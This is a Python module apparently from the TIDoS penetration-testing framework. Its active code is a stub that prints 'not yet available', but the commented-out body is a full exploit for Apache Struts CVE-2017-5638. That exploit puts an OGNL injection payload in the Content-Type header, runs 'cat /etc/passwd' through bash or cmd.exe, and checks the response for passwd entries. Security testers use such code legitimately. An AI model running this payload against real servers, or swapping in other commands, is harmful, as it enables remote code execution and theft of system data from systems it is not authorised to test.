#!/usr/bin/env python
from core.colors import color
def strutsshock(target):
    print('This module is not yet available.')
    pass
# #!/usr/bin/env python
# # coding: utf-8

# #-:-:-:-:-:-:-:-:-:-:-:-:#
# #    TIDoS Framework     #
# #-:-:-:-:-:-:-:-:-:-:-:-:#

# #Author : @_tID
# #This module requires TIDoS Framework
# #https://github.com/0xInfection/TIDoS-Framework

# from __future__ import print_function

# import re
# import requests
# import time
# from random import *
# import string
# from core.Core.colors import *

# def strutsshock0x00(web):

# 	print(GR+' [*] Parsing strings...')
# 	time.sleep(0.5)
# 	print(GR+' [*] Configuring payloads...')
# 	payload = "%{(#_='multipart/form-data')."
# 	payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
# 	payload += "(#_memberAccess?"
# 	payload += "(#_memberAccess=#dm):"
# 	payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
# 	payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
# 	payload += "(#ognlUtil.getExcludedPackageNames().clear())."
# 	payload += "(#ognlUtil.getExcludedClasses().clear())."
# 	payload += "(#context.setMemberAccess(#dm))))."
# 	payload += "(#cmd='cat /etc/passwd')."
# 	payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
# 	payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
# 	payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
# 	payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
# 	payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
# 	payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
# 	payload += "(#ros.flush())}"
# 	print(O+' [!] Setting Content-Type Payload : '+C+payload)
# 	headers = {'Content-Type': payload, 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:61.0) Gecko/20100101 Firefox/61.0'}
# 	time.sleep(0.5)
# 	print(O+' [*] Making no-verify request...')
# 	time.sleep(1)
# 	resp = requests.get(web, headers=headers, verify=False)
# 	if re.search(r'*?:/bin/bash',resp.content,re.I) or ('root:x' in resp.content and 'daemon:x:' in resp.content):
# 		print(G+' [+] Website Vulnerable to Apache Struts-Shock (CVE-2017-5638) ! ')
# 	else:
# 		print(R+' [-] The web seems immune to Apache Struts-Shock...')

# def strutsshock(web):

# 	print(GR+'\n [*] Loading module...')
# 	time.sleep(0.5)
# 	print(R+'\n    =======================================')
# 	print(R+'     A P A C H E   S T R U T S   S H O C K ')
# 	print(R+'    =======================================\n')
# 	strutsshock0x00(web)
